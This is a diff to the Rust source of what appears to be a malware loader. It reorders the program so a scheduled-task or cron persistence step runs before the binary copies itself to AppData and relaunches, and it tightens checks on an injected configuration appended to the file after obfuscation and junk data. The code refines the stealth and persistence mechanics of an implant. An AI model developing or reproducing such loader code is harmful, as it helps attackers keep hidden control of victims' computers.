@@ -141,15 +141,17 @@ fn main() {
 
     // 5. Persistence (skip on --boot relaunch)
     if !is_boot {
+        // Install scheduled task / cron first (before copy_and_relaunch which exits)
+        if loader_cfg.enable_persistence {
+            log!("[7/10] installing persistence...");
+            install_persistence();
+        }
+        // Copy to AppData and relaunch (exits process on success)
         if let Some(path) = loader_cfg.copy_to_path.as_deref() {
             if !path.is_empty() {
                 log!("[7/10] copy_to_path={}, relaunching...", path);
                 copy_and_relaunch(path);
             }
-        }
-        if loader_cfg.enable_persistence {
-            log!("[7/10] installing persistence...");
-            install_persistence();
         }
     } else {
         log!("[7/10] --boot: skipping persistence");
@@ -267,8 +269,9 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
     let json_start = pos + 4;
     log!("  json_len={}", json_len);
 
-    if json_start + json_len > data.len() {
-        log!("  json extends past EOF");
+    // Config must be at EOF (appended last after obfuscation/junk)
+    if json_start + json_len != data.len() {
+        log!("  config not at EOF (was {} vs total {})", json_start + json_len, data.len());
         return None;
     }
 
